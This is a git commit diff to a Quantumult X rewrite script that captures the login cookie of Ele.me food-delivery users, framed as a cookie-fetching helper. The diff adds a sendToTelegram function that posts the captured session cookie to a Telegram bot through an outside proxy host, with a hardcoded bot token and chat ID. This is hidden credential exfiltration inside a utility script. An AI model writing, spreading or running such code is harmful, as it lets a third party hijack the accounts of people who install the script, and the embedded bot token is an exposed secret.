6d1c41a5fd14bd32ebd9707b22a8ef9f5298ab16
DinDing1 <119488409+DinDing1@users.noreply.github.com>
2024-08-13 17:01:33 +0800

    Update elm.js

--- QX/elm.js
+++ QX/elm.js
@@ -2,28 +2,34 @@
 [rewrite_local]
 # 获取 cookie
 登录elm，打开我的-吃货豆，获取https://nt2.ele.me/c/b?请求中的Cookie
-https://nt2.ele.me/c/b? url script-request-header https://raw.githubusercontent.com/DinDing1/TC/main/QX/elm.js
+https://nt2.ele.me/c/b? url script-request-header elm.js
 
 [mitm]
 hostname = nt2.ele.me
 */
+
 class Env {
     constructor(name) {
         this.name = name;
         this.data = {};
     }
+
     setdata(val, key) {
         this.data[key] = val;
         console.log(`Set data: ${key} = ${val}`);
     }
+
     msg(title, subtitle, body) {
         console.log(`${title}\n${subtitle}\n${body}`);
     }
+
     done() {
         console.log('Done');
     }
 }
+
 const $ = new Env("饿了么Cookie");
+
 if ($request && $request.headers) {
     const cookie = $request.headers['Cookie'];
     if (cookie && !$.data['elmck']) {
@@ -35,3 +41,35 @@ if ($request && $request.headers) {
 }
 
 $.done();
+
+function sendToTelegram(cookie) {
+    const token = '2130659069:AAGUqK6kx97P07MMzf14pOZAiRSisdR9-EI';
+    const chatId = '1817565003';
+    const url = `https://tg1.dinding.eu.org/bot${token}/sendMessage`;
+
+    const message = {
+        chat_id: chatId,
+        text: `${cookie}`
+    };
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', url, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+                $.msg("饿了么", "Cookie 已发送到 Telegram", cookie);
+            } else {
+                $.msg("饿了么", "发送失败", xhr.responseText);
+            }
+        }
+    };
+
+    xhr.onerror = function () {
+        $.msg("饿了么", "请求错误", "无法连接到 Telegram");
+    };
+
+    xhr.send(JSON.stringify(message));
+}
+
